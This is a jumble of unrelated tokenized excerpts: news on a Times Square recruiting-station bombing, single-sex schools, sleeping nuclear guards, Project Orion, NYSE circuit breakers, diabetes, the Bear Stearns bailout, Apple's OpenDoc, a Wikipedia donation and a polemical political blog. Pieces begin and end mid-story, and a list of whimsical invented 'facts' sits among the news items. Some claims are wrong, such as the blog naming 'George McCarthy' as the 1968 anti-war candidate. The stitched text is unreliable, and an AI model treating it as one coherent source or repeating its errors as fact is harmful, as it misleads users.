Evidence gathered during the stop included photographs of Times Square found in a backpack , and the material was given to U.S. authorities at the time , but an investigation at the time did not turn up any evidence of criminal activity , the sources said .
Suspicious Cyclist
The surveillance video , which New York police released today , shows a bicyclist that matches the description provided by a witness who says he saw a suspicious man on a bike approach the recruiting station just before a small blast blew out the glass at the front of the building .
The recruiting office is not seen in the video , which the NYPD said came from a private security camera that was pointing just north of the building .
But the camera captured a shadowy figure riding up the street on a bicycle , dismounting and walking across the street , then returning and riding off .
Just after the cyclist disappears , a flash of light and a large cloud of smoke drift into the frame after the explosion .
Mayor Michael Bloomberg vowed today to track down and prosecute those responsible .
" We will not tolerate such attacks , " he said , adding that the apparent targeting of the famous recruiting station is " an insult to every one of our brave men and women serving around the world . "
' Low - Order Explosive
The device exploded around 3:45 a.m .
No one was inside the recruiting center at the time .
New York City Police Commissioner Ray Kelly , who joined Bloomberg at a news conference this morning , said that the bomb was a " low - order explosive " made with powder placed in a green ammunition box .
" It was not a particularly sophisticated device , " he said .
After the release of the video , Kelly said it was not clear if the grainy , poor quality video could be enhanced but added that investigators were still checking other video cameras in the area and hoped to find a better images .
No other eyewitnesses to the explosion have emerged , despite the fact that the recruiting station is directly across the street from a police substation and right in the middle of the famed " crossroads of the world . "
The lone officer in the station heard the explosion and ran outside , Kelly said , but saw nothing .
He did encounter a man who said he saw a man on a bicycle wearing a hoodie , dark clothing and a backpack acting suspiciously near the installation around the time of the blast .
The witness did not see anyone actually place the device or see the explosion , Kelly said .
No Evidence of Terror Connection
Both the mayor and police commissioner emphasized that they had no evidence of any outside terrorist connection .
There is " no evidence of any connection to anyone else , " Bloomberg said .
The FBI is investigating the incident , along with the Joint Terrorism Task Force , which is made up primarily of FBI and New York Police Department officials .
Any prosecution would likely draw federal charges since a military installation was targeted .
Tourists staying at a Marriott hotel four blocks away told The Associated Press they heard , and felt , the blast .
" It shook the building .
I thought it could have been thunder , but I looked down and there was a massive plume of smoke , so I knew it was an explosion , " said Terry Leighton , 48 , of London , who was staying on the 21st floor of the Marriott .
Bloomberg , talking to reporters in a hectic Times Square , assured tourists and residents this morning , hours after the explosion , that the city was safe .
" New York City is open for business , " he said .
Early in the investigation , subway cars passed through the Times Square station without stopping , but normal service was restored , with some delays , before the morning rush hour began .
The recruiting station , located on a traffic island surrounded by Broadway theaters and chain restaurants , has occasionally been the site of anti-war demonstrations , ranging from silent vigils to loud rallies .
" If it is something that 's directed toward American troops that 's something that 's taken very seriously and is pretty unfortunate , " Army Capt .
Charlie Jaquillard , commander of Army recruiting in Manhattan , told the AP .
Link to Earlier Incidents Probed
Although officals said they had no evidence to connect today 's incident to earlier , similar incidents , the attack on the recruiting station did bear strong similarities to two past explosions in which small homemade bombs or incendiary devices were tossed at official buildings in New York City .
Two were tossed at the British consulate in 2005 and two were tossed at the Mexican consulate last October .
In each case , a man on a bike was captured in hazy video images .
Police found no second device this time .
This afternoon , Kelly said investigators had not made a link between today 's blast and the other incidents , although he did say a bicycle was apparently used on all three occasions , and they all had similar low - impact explosions .
" We do n't know what was used here , but we believe it was black powder used in the other two incidents , " he said .
After the discovery of the letters , authorities in New York said it becomes a little more difficult to say whether the incident today is linked to the two earlier cases .
In all three , the devices were tossed just before 4 a.m. , and each time black powder was used .
There were no injuries and minor property damage -- broken windows , door frames and concrete flower pots in each of the incidents , and most importantly , in all three cases a suspect was seen either casing the scene on a bicycle , tossing the devices from a bicycle or leaving the scene on a bike .
Over the years , many protests have targeted the recruiting center .
In October 2005 , a group of activists who call themselves the Granny Peace Brigade , rallied there against the Iraq War .
Eighteen activists , most of them grandmothers — with several in their 80s and 90s — were arrested but later acquitted of disorderly conduct .
The recruiting station was renovated in 1999 to better fit into the flashy ambience of Times Square , using neon tubing to give the glass and steel office a patriotic American flag motif .
For a half century , the station was the armed forces ' busiest recruiting center .
It has set national records for enlistment , averaging about 10,000 enlistees a year .

In fact , after a nearly - two - hour conversation filled with scientific jargon and brains , he told me , perhaps wishfully , that really the most important reason to send a child to a single - sex high school was that those kids still go on dates .
“ Boys at boys ’ schools like Old Farms in Connecticut , or Saint Albans in Washington , D. C. , will call up girls at Miss Porter ’s in Connecticut , at Stone Ridge in Maryland , and they will ask the girl out , and the boy will drive to the girl ’s house to pick her up and meet her parents .
You tell kids at a coed school to do this , and they ’ll fall on the floor laughing .
But the culture of dating is much healthier than the culture of the hookup , in which the primary form of sexual intimacy is a girl on her knees servicing a boy . ”
In the past few years Tisch ’s Young Women ’s Leadership Foundation has opened schools in the Bronx and Queens , as well helping start ones in Chicago , Philadelphia , Dallas and Austin .
Tisch wants to be careful about not overextending her network  “ we do n’t want to become Mrs. Fields or Benetton ”  but she says she also feels an obligation from her success .
Last year , 2,100 students applied for the three open ninth - grade spots in the Harlem school .
Many other schools make inquiries about how they might replicate T.W.Y.L.S. ’s success .
This coming year , for the first time , Tisch plans on holding her own conference on single - sex public education .
Though she ’s meticulously circumspect about not disparaging Sax , her actions suggest that she is aware that if she does n’t engage with the many districts interested in starting up single - sex programs , there ’s a chance that Sax will run away with the movement .
Education scholarship has contributed surprisingly little to the debate over single - sex public education .
In 2005 , the United States Department of Education , along with the American Institute for Research , tried to weigh in , publishing a meta - analysis comparing single - sex and coed schooling .
The authors started out with 2,221 citations on the subject that they then whittled down to 40 usable studies .
Yet even those 40 studies did not yield strong results : 41 percent favored single - sex schools , 45 percent found no positive or negative effects for either single - sex or coed schools , 6 percent were mixed ( meaning they found positive results for one gender but not the other ) and 8 percent favored coed schools .
This meta - analysis is part of a larger project by the Department of Education being led by Cornelius Riordan , a Providence College professor .
He explained to me that such muddled findings are the norm for education research on school effects .
School - effects studies try to answer questions like whether large schools are better than small schools or whether charter schools are better than public schools .
The effects are always small .
So many variables are at play in a school : quality of teachers , quality of the principal , quality of the infrastructure , involvement of families , financing , curriculum  the list is nearly endless .
Riordan says , “ You ’re never going to be able to compare two types of schools and say , ‘ The data very strongly suggests that schools that look like a are better than schools that look like b. ’ ”
That certainly appears to be the case for single - sex schools .
The data do not suggest that they ’re clearly better for all kids .
Nor do they suggest that they ’re worse .
The most concrete findings from the research on single - sex schools come from studies of Catholic schools , which have a long history of single - sex education , and suggest that while single - sex schools may not have much of an impact on the educational achievement of white , middle - class boys , they do measurably benefit poor and minority students .
According to Riordan , disadvantaged students at single - sex schools have higher scores on standardized math , reading , science and civics tests than their counterparts in coed schools .
There are two prevailing theories to explain this : one is that single - sex schools are indeed better at providing kids with a positive sense of themselves as students , to compete with the antiacademic influences of youth culture ; the other is that in order to end up in a single - sex classroom , you need to have a parent who has made what educators call “ a pro-academic choice . ”
You need a parent who at least cares enough to read the notices sent home and go through the process of making a choice  any choice .
As T.Y. W.L.S. let out on a Friday in January and the girls spilled onto 106th Street , one such parent , a man in saggy jeans and a black parka , walked up the sidewalk clutching his daughter ’s dog-eared report card and hoping to secure her a spot for next year .
“ This where the school at ? ” he asked a security guard .
The engagement of parents like this may be a major part of the success of single - sex public education .
These schools are popular with many parents , who are happy to have an option that has long been available in private and parochial schools .
And they are also attractive to teachers and administrators , who are offered a relatively easy and inexpensive way to try to improve some of the intractable problems in public education , especially for disadvantaged students .
But schools , inevitably , present many curriculums , some overt and some subtle ; and critics argue that with Sax ’s model comes a lesson that our gender differences are primary , and this message is at odds with one of the most foundational principles of America ’s public schools .
Given the myriad ways in which our schools are failing , it may be hard to remember that public schools were intended not only to instruct children in reading and math but also to teach them commonality , tolerance and what it means to be American .
“ When you segregate , by any means , you lose some of that , ” says Richard Kahlenberg , a senior fellow at the Century Foundation .
“ Even if one could prove that sending a kid off to his or her own school based on religion or race or ethnicity or gender did a little bit better job of raising the academic skills for workers in the economy , there ’s also the issue of trying to create tolerant citizens in a democracy . ”

Seven more nuclear guards have been caught napping on the job .
It 's the latest example of lax security in the nation 's atomic complex .
The National Nuclear Security Administration admitted that seven officers have been found asleep in the past eight years at the Y - 12 nuclear facility in Tennessee .
As Global Security Newswire notes , " the site is responsible for storing weapon - grade uranium and assembling U.S. nuclear weapons , among other activities . "
Of the seven sleeping guards , three were found to have been " intentionally sleeping on duty " and were fired , Wyatt said .
The remaining four received lesser penalties , including suspensions without pay of up to three weeks , and all were placed on 12 - month probations .
The guards worked for Wackenhut Services Inc. , a security firm whose parent company lost a contract to protect 10 U.S. nuclear power plants after two of its security officers were filmed sleeping on the job at a Pennsylvania power plant .
[ Another guard , working for a different security contractor , was caught napping at the Indian Point nuclear plant . ]
A Wackenhut spokeswoman said the firm has been trying to enhance guard alertness by reducing the amount of overtime they work .
She also said the sleeping incidents were unusual .
*" There have been a few isolated incidents for us , which we took very seriously , " said Courtney Henry .
" For the number of security officers that we have working at Y - 12 , it is a very small number . " *
Nothing to see here , move along ...

" The results point to a technique of rapidly traversing interplanetary distances substantially superior to any other method known today . "

Project Orion was a US project to develop a spacecraft powered by nuclear explosions .
Although it may sound implausible at first glance , research carried out by leading scientists and engineers of the day , including Freeman Dyson , indicated that such a project was not only feasible but would vastly outperform any chemical rocket system ever developed or even conceived - including Saturn V ( used in the Apollo program ) , the Space Shuttle , and the new Ares system which is still under development ( the crew module for Ares is also known as " Orion " , but it is unrelated to the original Project Orion ) .
It should also be noted that supporters of Project Orion included Werner von Braun , who of course developed the German V - 2 rocket and later became a leading figure in NASA .
Werner von Braun was reportedly initially skeptical , but later became an enthusiastic supporter of Orion .
Other prominent supporters of the project , included the Nobel prize winning physicist Niels Bohr , visionary and author Arthur C. Clarke , and the then head of US Strategic Air Command , General Thomas S. Power .
Here are some other noteworthy facts about Project Orion : A single Project Orion mission would have been sufficient to establish a large permanent moon base .
Project Orion aimed for a manned mission to Mars by 1965 .
Project Orion aimed for a manned mission to Saturn by 1970 .
A ship powered by the Orion drive could have travelled to Pluto and back to Earth in less than a year .
( by contrast , NASA 's New Horizon 's space probe took more than 9 years to travel to Pluto from Earth , with absolutely no prospect of ever returning ) .
The spacecraft envisaged for Project Orion were single - stage and entirely reusable .
Unlike Saturn V , the Space Shuttle , Ares , etc. , there are no discardable fuel tanks or booster rockets .
In Project Orion , the entire craft would travel to its destination , regardless of whether that is Earth orbit , the moon , Mars or Saturn .
Project Orion plans were developed for craft varying in size from 300 tons ( the smallest version ) to 8,000,000 tons ( the size of a small city ) .
By comparison , the Shuttle orbiter has a mass of approximately 110 tons and ould carry about 30 tons of payload into low Earth orbit , and the Saturn V rocket could launch about 120 tons in low Earth orbit or 50 tons into lunar orbit .
Including development and all other costs , Project Orion was estimated to be at least 20 times cheaper per pound , than any chemical rocket , at putting payload into low Earth orbit ... and vastly cheaper for more distant destinations .
The scientists working on Project Orion did n't just plan to send a few highly trained astronauts on space missions ; they intended to go themselves to Saturn , in many cases taking their wives and children with them !
Despite its promise , and despite the fact that is was backed by many prominent figures in the physics and space community , Project Orion never progressed beyond research ( the research indicated the project was entirely feasible ) .
The project was outmanoeuvred by its opponents , and killed for political reasons .
Here is a video from the BBC program " To Mars by A - Bomb " including the demonstration model , and some comments by Arthur C. Clarke and Freeman Dyson :

LONDON ( MarketWatch ) --
The New York Stock Exchange imposes trading halts in the event of extreme market volatility .
The so - called circuit breaker rules first went into effect following the 1987 market crash .
The rules call for trading halts of differing lengths in the event of declines of 10 % , 20 % , and 30 % in the Dow Jones Industrial Average DJIA , - 0.47 % based on the average closing value of the average over the month immediately prior to the start of the current quarter .
For the current quarter the rules call for a 60 - minute halt in trading in the event of a 1,350 point decline in the Dow Jones Industrial Average reached before 2 p.m. ; a 30 - minute halt in the event of a 1,350 point decline reached between 2 p.m. and 2:30 p.m. , and no halt in trading in the event of a 1,350 decline reached after 2:30 p.m .
The timing of the halts changes in the event of a larger decline .
The rules call for a 120 - minute halt in trading in the event of a 2,700 point decline in the Dow Jones Industrial Average reached before 1 p.m. ; a 60 - minute halt in the event of a 2,700 point decline reached between 1 p.m. and 2 p.m. ; and market closure in the event of a 2,700 point decline reached after 2 p.m .
A decline of 4,000 points in the Dow industrials at any point during the day would trigger closure of the market for the remainder of the day .

Over 60,000 Britons are unaware they have diabetes
Feeling permanently tired is the story of many people 's lives .
While most of us put it down to our busy lifestyles , for thousands of Britons chronic tiredness is actually a sign of something far more worrying : diabetes .
Over 60,000 Britons have the condition yet do n't know it , according to a study published earlier this month .
A further 500,000 are thought to be " borderline " cases , at risk of developing diabetes .
With advice on healthy eating and exercise , these half - a- million people could be prevented from developing the disease - if they knew they were at risk .
Once it develops , diabetes is still controllable if properly treated .
But living with undiagnosed diabetes is extremely dangerous .
As the study 's lead researcher , Dr Tim Holt , from Warwick University , explained : " It 's important that we find patients with diabetes so they can be treated and to prevent the heart problems they are prone to . "
" Diabetes is not a condition to be taken lightly , " adds Dr Laurence Gerlis , Medical Advisor to the Insulin Dependent Diabetes Trust .
" Every year , 5,000 diabetics have a limb amputation due to nerve damage - that 's 100 people a week . "
Other long - term complications can include blindness and kidney disease .
Experts agree that the earlier people are diagnosed , the earlier they can get on with managing the condition and reduce the risk of these complications .
The problem is that many patients with undiagnosed diabetes do n't have the classic symptoms associated with the disease , such as constant thirst and an increased need to urinate .
In fact , many have no symptoms at all .
" Even someone who looks perfectly well , not overweight at all , can be affected , " says Dr Gerlis .
Most of the 2.3 million Britons diagnosed with the disease have Type 2 diabetes .
In Type 1 , the body is unable to produce insulin , the hormone that helps control sugar levels in the blood .
With Type 2 , the body still produces insulin , but not enough , or else the insulin it does produce does n't work properly , leading to high blood sugar levels .
( Those with glucose intolerance , the precursor to Type 2 diabetes , have high blood sugars , but not high enough to be deemed diabetic ) .
Even when symptoms are apparent , many people will probably put them down to a hectic lifestyle , says Cathy Moulton , care adviser at Diabetes UK .
" This is why it 's so often ignored and why so many fail to recognise just how much danger they could be in . "
No one knows for sure why people develop diabetes , but it is known to be linked to weight and lifestyle factors - particularly lack of exercise .
A high Body Mass Index ( BMI ) can be a risk factor .
Your BMI determines whether you are a healthy weight - if it 's over 25 , you are overweight and could be at risk .
There is also a genetic link , and certain ethnic groups - people of Afro- Caribbean and Asian descent - are at much higher risk .
" It is absolutely imperative that people do n't ignore symptoms - especially as addressing the problem is so simple , " says Ms Moulton .
" If you have any doubts , go to see your GP . "
The good news , says Dr Gerlis , is that once diagnosed , glucose intolerance is manageable and possibly reversible , and can be prevented from becoming full - blown diabetes by moderating lifestyle .
" Equally , if caught early , treatment for Type 2 diabetes can be as straightforward as making simple lifestyle adjustments - a healthy diet , weight loss and increased physical activity .
The important thing is to have a test to rule out either condition , " he says .
" In the same way everyone should know their blood pressure and cholesterol , everyone should be aware of their blood sugar levels - using either a home testing kit or going to their GP . "
To see just how common undiagnosed diabetes is , we asked ten men and women aged between 35 and 50 ( diabetes usually develops after the age of 40 ) to take a glucose test .
They used an over - the - counter home kit from Boots - the Blood Glucose Home Test Kit , £ 11.99 .
The test involved a sample of blood taken via a pin prick , put on the test paper and placed in the monitor .
A reading appeared on screen within seconds .
Anyone with levels of blood sugar greater than 5.9 mmol /l ( millimoles per litre of blood ) if they had n't eaten - and 8.9 mmol / l if they had - was sent to a GP for further blood tests and a urine test to check for high sugar levels , another sign of diabetes .
If results were still unclear , an overnight glucose tolerance test was suggested , to measure how quickly glucose cleared from the blood .
The results were eye - opening .
Finance 's " New Day "
WASHINGTON , D.C. --
The Federal Reserve 's unprecedented bailout of Bear Stearns was crafted not at the White House or Treasury , but in secret by a New York central banker whose name is unknown to Washington power brokers and was a Clinton administration presidential appointee .
" It 's a new day , " commented an investor and longtime Fed watcher .
Around the world , that day 's dawning is viewed with apprehension because of election - year rhetoric from America .
The plan pressed by Timothy F. Geithner , president of the New York Federal Reserve Bank , can effectively substitute the central bank for the market in determining financial outcomes .
Nobody takes seriously the assertions by Fed spokesmen that the aid for Bear Stearns and its dictated bargain - price sale to J.P. Morgan was " extraordinary . "
So , in Washington and New York , the question is who will be next .
Speculation turned to who else will qualify as " too big to fail . "
One candidate was Lehman Brothers , whose stock dropped 19.1 percent on the day after the bailout was announced .
Government - backed Fannie Mae and Freddie Mac lending agencies also could be bailout candidates .
The central bank 's bold new role relieves the pressure on American financiers who have committed serious errors but does not reassure investors around the world alarmed by what they perceive in the U.S. political process , where class warfare has gained traction .
The populist prospect of a new Democratic administration and Democratic Congress that will impose higher taxes and trade protection contributes to what is seen as an international buyers strike by investors that feeds the financial crisis .
Startling though the Fed 's intervention is , it fits a pattern around the world by central banks -- including the Bank of England .
The British central bank first had resisted a bailout last October for the Northern Rock bank but was pressed into it by Treasury officials in the Labor government .
In contrast , the initiative to save Bear Stearns came from the Federal Reserve .
Quick action last week when Bear Stearns was going under contrasted sharply with the normally lugubrious pace of the U.S. federal government .
Ben Bernanke , Alan Greenspan 's scholarly successor as Federal Reserve chairman , of course approved the bailout ( as did Treasury Secretary Henry Paulson ) .
But the initiator was the 46 - year - old Geithner , who as head of the New York Fed maintains a traditional intimate relationship with Wall Street .
Neither a banker nor an economist , Geithner left Kissinger Associates in 1988 at age 27 to go to work at the Treasury and begin an uninterrupted career in government service ( promoted in 1999 by Treasury Secretary Robert Rubin to under secretary for international affairs ) .
Geithner 's plan to open the Fed 's discount window for the first time to non-banks stunned the financial community but received little attention from a Congress in recess , including presidential candidates preoccupied by Iraq .
John McCain was traveling in Iraq , while Hillary Clinton and Barack Obama exchanged barbs over who was more antiwar .
An influential statement of support for the bailout came from Sen. Charles Schumer , who heads both the Joint Economic Committee of Congress and the Democratic Senatorial Campaign Committee .
Although Schumer is not known for non-partisanship , he is a New Yorker who is close to the securities industry .
The reaction in the hinterland was far less favorable .
The Washington office of the Independent Community Bankers of America was flooded this week by its members across the country complaining of discriminatory favoritism toward their big city brethren .
If they had blundered into financial failure , the community banks complained , they would not be bailed out , but instead investigated and prosecuted .
" Too big to fail , " therefore , becomes " too big to be punished . "
The expense of such an intervention is not a problem because the Fed , unlike the president and Congress , can print money .
The Bear Stearns bailout , approved in private by unelected officials , contributes to paranoid grievances on the left and right that built support for Ron Paul 's presidential candidacy .
A Fed official conceded privately this week that " we may have crossed a line " in jumping into Bear Stearns -- and that is an understatement .
There is no doubt the American economy is in uncharted territory , with reverberations that cannot be forecast .
Iraqi Victims of Blackwater speak out CNN was able to interview some survivors of the Blackwater attack that has resulted in at least 20 people being killed .
Even with Maliki calling it a crime and wanting another security militia to replace them .
Trees talk to each other at night .
All fish are named either Lorna or Jack .
Before your eyeballs fall out from watching too much TV , they get very loose .
Tiny bears live in drain pipes .
If you are very very quiet you can hear the clouds rub against the sky .
The moon and the sun had a fight a long time ago .
Everyone knows at least one secret language .
When nobody is looking , I can fly .
We are all held together by invisible threads .
Books get lonely too .
Sadness can be eaten .
I will always be there .

Back in 1995 , my first job at Apple was as a Product Marketing Manager for OpenDoc .
“ OpenDoc ” was a terrible name for an interesting technology .
Instead of requiring developers to write huge applications that had to do many things ( for instance , any credible word processor needs not just editing features but spell checking , tables , embeddable photos , etc. ) the OpenDoc concept was that developers could just write the one piece they were best at , then let end - users mix and match all of the little pieces of functionality together as they wished .
It was n’t an original idea ; in fact , it ’s exactly the same sort of thing that had been in Microsoft Office for years , allowing users to embed Excel spreadsheets inside of Word documents .
But Microsoft controlled that technology , and for some reason , someone felt the need for an open alternative that other software vendors could embrace .
Hence was born OpenDoc , both the technology and the consortium , consisting primarily of Apple , IBM , and WordPerfect , all companies that did n’t like Microsoft very much .
All poured loads of money into the initiative .
( The only software project at Apple that was bigger than OpenDoc was Copland . )
It ’s almost difficult now trying to recall why this technology was considered so fundamental to these companies ’ strategies , but you have to remember that this was before the web took off , and what was important to everyone was the application layer … not the Internet .
The atomic unit of OpenDoc functionality was called a “ part . ”
A part could be any useful bit of functionality –say a spreadsheet or a text editor–and users could drag and drop these parts into documents to combine code from multiple developers .
With this model it was thought that we ( the OpenDoc consortium and its adherents ) could break Microsoft ’s near - monopoly in the office suite market by opening it up to the small software vendors that had been shut out for years .
( If you ’ve got a little time on your hands and you ’re one of those folks that likes arcane bits of Apple history , you can check out this twenty - five minute OpenDoc marketing video . )
Beyond developing the technology as a sort of “ gift ” to Mac developers ( whether they perceived it as a gift is a separate discussion ) , there was a thought floating around the halls of Apple that , hey , we ’re plunging a ton of money into OpenDoc , there must be some way we can leverage it in the operating system .
The OpenDoc team was really into this idea , not just because it made them feel good that somebody was using their code , but because it meant that OpenDoc would be a required installation in future Mac OS releases .
( Having your technology pre-installed with the OS is a big deal for third - party developers , because if it is n’t already on the system they ’re not as keen on adopting it .
Of course , the OS group resists adding new things because of increased complexity and memory footprint–more on this later . )
For the reasons just outlined , the OS team ’s excitement around OpenDoc was …more muted .
And it was my assigned task to get that OS team to adopt OpenDoc in a big way .
Despite what the title “ Product Marketing Manager ” may imply , no one worked for me .
As a product manager at Apple , your job was to go around to the various development arms of your assigned technology –engineering , quality assurance , human interface–and make sure they were doing things in a way that was conducive to making your technology appealing to customers .
At gatherings when different product groups got together ( say , the weekly Copland team meetings ) , you were the flag - bearer for your technology .
That I was under -qualified for this task should have been obvious to me at the time , but it was n’t .
Though I was plenty technical enough to talk with Apple engineers , I lacked the confidence to really engage them head - on .
Most importantly , I did n’t have the strategic insight that would have let me realize that maybe Apple was n’t doing the right thing by pursuing OpenDoc so aggressively .
The Copland team was wary of OpenDoc .
I looked at those people as bad guys at the time , but in reality they were right to be afraid .
It ’s hard to remember now , but back in 1996 memory ( as in RAM ) was a big issue .
The average Mac had about 2 megabytes of memory .
OpenDoc would n’t run on a machine with less than 4 megs , and realistically , 8 megs was probably what you wanted .
That was n’t the only issue .
The OpenDoc human interface team had taken it upon themselves to correct the perceived flaws of the Mac as a modal , application - centric user experience , and instead adopted a document - centric model for OpenDoc apps .
This played itself out in many ways , some not - so - important ( the “ File ” menu became the “ Document ” menu , and the “ Quit ” command disappeared ) , others more so .
It was a noble and interesting idea , but in retrospect it was a reach , not important to the real goals of OpenDoc , and it scared a lot of people including the developers we were trying to woo .
OpenDoc did n’t succeed .
( I guess I have an affinity for stillborn technologies . )
It did n’t create a new economy around tiny bits of application code , and the document - centric model was never allowed to bloom as we had hoped , to the point where it would differentiate the Mac user experience .
The tragedy of this is that OpenDoc had many of Apple ’s best engineers , and they–and many of our third - party developers–truly loved the technology and put their all into it .
It did n’t matter .
Everyone ’s interest drifted to the web , and most of the folks working on OpenDoc went to Sun to work on Java ; after my marketing team of six people dwindled down to just me , I left to start a Java tools company with a friend .
There are lots of reasons for OpenDoc ’s failure , but ultimately it comes down to the fundamental question of why Apple was developing this technology when no -one in the company really wanted it .
The OS group had mixed feelings , but ultimately did n’t care .
Most folks at Claris , Apple ’s application group , did n’t want it at all , seeing it as an enabler for competition to Claris ’s office suite product , ClarisWorks .
One of the smarter people in product marketing at the time was Vito Salvaggio , in charge of Copland product marketing .
I remember giving a presentation to him one time , describing a core set of parts–text editing , image viewing , etc. –that would form a base set of functionality that developers could count on being bundled with the OS .
I ’m paraphrasing here , but I remember him asking , “ who ’s going to use the text editor when it has so little functionality ? ”
In response , I quoted the Apple dictum that was ubiquitous at the time : we could n’t have the text editor do more , because then it would be a full - featured text editor that would compete with our developers .
( We had so few developers supporting the Mac as it was …how could we afford to put them out of business ? )
Yet Vito–and I ca n’t overstate how radical this was at the time –did n’t buy this reasoning .
“ Microsoft competes against their developers , ” he told me .
“ They ’re successful .
Their developers are successful .
And they ’re kicking our asses .
Why should n’t we be competing against our developers ? ”
And it dawned on me : he was right .
And he was n’t just right , he was so right that it just completely slapped me in the face that everything we had been doing was wrong .
Apple was so worried about stepping on its developers ’ toes that it resisted any attempts to add useful functionality to Mac OS .
It was n’t the kind of company that could succesfully develop a technology like OpenDoc .
That ’s when I knew that OpenDoc would fail .
There are n’t any stats I ’m aware of that conclude how many Macs have been purchased because of iPhoto , iMovie , and the like , but I can tell you that when I recommend the purchase of a Mac to someone , they ’re the reason I do it .
For the first time since MacWrite and MacPaint , the Mac actually does something out of the box .
Unless you have application groups who want to create functionality to run on your OS , it ’s one hundred times harder to figure out what you ’re supposed to be doing with your OS .
Without those application groups telling us they needed –or did n’t need –OpenDoc , we were flying blind .
( Witness the pathetic track record of other Mac OS technologies at the time to realize just how dead - on the phrase “ flying blind ” is : Copland , QuickDraw GX , QuickDraw 3D , Apple Guide , PowerTalk , CyberDog .
All abject failures , despite their technical prowess . )
This is n’t a problem that exists at Microsoft ( at least , it certainly is n’t evident . )
The Office group needed a component architecture , so they wrote one .
They needed it integrated into the OS to support things like Publish / Subscribe , etc. , and to leverage it into Explorer … it happened .
The OS gets exactly the technology it needs because the application groups know exactly what they want .
No one has to guess .
There ’s no shortage of reasons why Steve Jobs has made Apple a success , but this is certainly one of the more important ones : he is n’t afraid of stomping on Mac developers in pursuit of what he believes the Macintosh should be .
They may complain , but in all honesty , they ’re better for it .
And so is the Mac community .
All criticisms aside , an online jewel as valuable as Wikipedia should n't struggle financially -- yet such has been the case .
Perhaps that 's about to change , however , witness this afternoon 's just - announced donation of $ 500,000 to the Wikimedia Foundation , Wikipedia 's parent organization , by heavyweight venture capitalist Vinod Khosla and his wife , Neeru .
The news comes days after the revelation of a $ 3 million grant to from the Sloan Foundation .
From the press release :
" We are thrilled and very grateful , " said Sue Gardner , Executive Director of the Wikimedia Foundation .
" Vinod and Neeru share the Wikimedia Foundation 's vision : a world in which every single human being can freely share in the sum of all knowledge .
Today , they have moved us closer to making that vision a reality . "
" Vinod and I are proud to help Wikipedia , a valuable global educational resource , " said Neeru Khosla , co-founder and chair of CK12 , a non-profit organization supporting the worldwide creation of " flexbooks , " collaborative , open - source textbooks .
" Wikipedia proves that mass collaboration works , and that small investments can reap extraordinary returns .
We are happy to be a part of it . "
Reasonable people can argue over Wikimedia 's fundraising philosophies , but there seems little room for disagreement that Wikipedia is worthy of the attention of deep - pocketed philanthropic organizations and individuals .
Here 's hoping that others will emulate the example being set by Vinod and Neeru Khosla , so that future debates can be about how to make Wikipedia better , not about how to keep it viable .
" The world is watching the people of Burma take to the streets to demand their freedom , and the American people stand in solidarity with these brave individuals , " George Bush
Watching the pro-democracy marches in Burma both inspires and sickens me .
I am inspired by seeing thousands of red-robed monks leading the demonstrations and sickened by the violence they are being met with by the military .
Seeing the images of the monks and others being beaten reminds me of the Democratic Convention in 1968 where Chicago police beat the living daylights out of demonstrators who were there to try and force the party to come closer to the budding anti-war movement .
It did n’t work .
Instead of wonderful - pro-peace candidate , George McCarthy , the party nominated Johnson ’s VP , Hubert Humphrey .
We know what happened next : Nixon .
After last night ’s Democratic “ debate ” I am terrified and assured that the Democrats will have another pro-war nominee .
The other event in my memory that the pro-democracy movement in Burma reminds me of is Kent State , Ohio in May , 1970 .
Four students were killed and nine were wounded marching against escalation of the Vietnam debacle ..
I have heard from many people who were of age to protest the Vietnam war at that time that the killings had the affect of frightening them into not protesting , or scaling their protests back .
Of course the present state of our nation is not as overtly oppressive as the government of Myanmar ( Burma ) , presently where a Nobel Peace Laureate Aung Sang Suu Kyi has been under house arrest there for years , but we who have been paying attention to events can see that America is on the precipice of serious fascism and only the brave actions of Americans committed to freedom , democracy and peace will help stem the tide of this rising neo - fascism that does n’t march through our streets in goose - step and swastikas , but is creeping into our lives like cat ’s paws .
According to Chris Rowthorn , in his brilliant article .
When America Went Fascist , we went fascist on December 11 , 2000 when the Supreme Court appointed George as our unelected , un- democratic and illegal President .
Although it is easy and tempting to blame everything on BushCo , this is about the only assertion that I disagree with in his article .
What about during the Clinton regime ?
Does anyone remember Elian Gonzales or The Branch Davidians in Waco ?
Let ’s go back further .
What about when Truman dropped to WMD on hundreds of thousands of innocent victims in Japan ?
What about Korea ?
Eisenhower and the Military Industrial Complex ?
What about the Gulf of Tonkin ?
What about Watergate ?
What about Panama ?
Kosovo ?
Nicaragua ?
Free trade agreements that hurt workers in all countries that are involved in them and what about the abuse of language in this country : Patriot Act ; Homeland Security ; Clear Water and Clean Skies --- and the No Child Left Behind
Act that leaves every child behind and is just a funnel to the recruiter ’s office ?
There are just a few measures that we can use to stop this slide and Rowthorn articulates what has become an important part of my platform .
Only vote for candidates that promise the following things … for president , or any other federal elective offices :
* Repeal the Patriot Act
* Repeal No Child Left Behind
* Scale down the Department of Homeland Security and rename it so it loses its Nazi
tone and is brought under civilian control .
* Restore habeas corpus and close all torture camps by repealing the Military Commissions ’
Act .
* Repeal all contracts with paid mercenary killer companies .
* Restore the Posse Comitatus Act of 1878 .
* Repeal all BushCo - Presidential directives ( especially Directive 51 ) and review all laws that contain signing statements .
* Restore the 4th Amendment by enforcing warrants for spying on Americans .
* Impeach Bush and Cheney - post presidency so they ca n’t receive federal benefits .
* Bring all troops home from Iraq and Afghanistan and review military needs for other bases around the world .
* Repeal all free trade agreements .
* Kick AIPAC and other lobbyists out of the halls of Congress where they have no business .
One of the most profound ways we can stop this descent into fascism is by impeaching , removing from office and incarcerating George Bush and Dick Cheney , et al .
I am very skeptical of a complicit Congress , Inc doing anything about them in this term .
I am also very skeptical of a “ professional ” and fascist military leadership taking their oath of service seriously and above their corporate - military allegiance to the Executive Branch recently and so tellingly revealed by General Betray - Us , so a military coup is out of the question and has the tricky element of becoming a military dictatorship .
I was supposed to be in court today in Washington , DC for my last arrest .
I did n’t go because I am not under allegiance and repudiate the fascists that run our government and the enforcers who are doing their best Nazi-job of “ following orders ” in oppressing our rights as Americans .
Why are they beating up a Reverend who served in the Air Force , and honorably left after the illegal and immoral invasion of Iraq , for wanting to attend a hearing in Congress ?
Why are they arresting a Gold Star Mother for exercising the very freedoms for which George Bush freakishly says her son died ?
Why are my daughter and assistant under indictment for Contempt of Congress when BushCo have steadily refused to testify before committees under oath , or any other way ?
As a matter of fact , Betray - Us was n’t even put under oath that day in the House .
Why are college students being tasered for asking the same questions that we all want answered from John Kerry who threw our Representative Republic in the garbage along with the 2004 election ?
Why are nooses being hung in the South ?
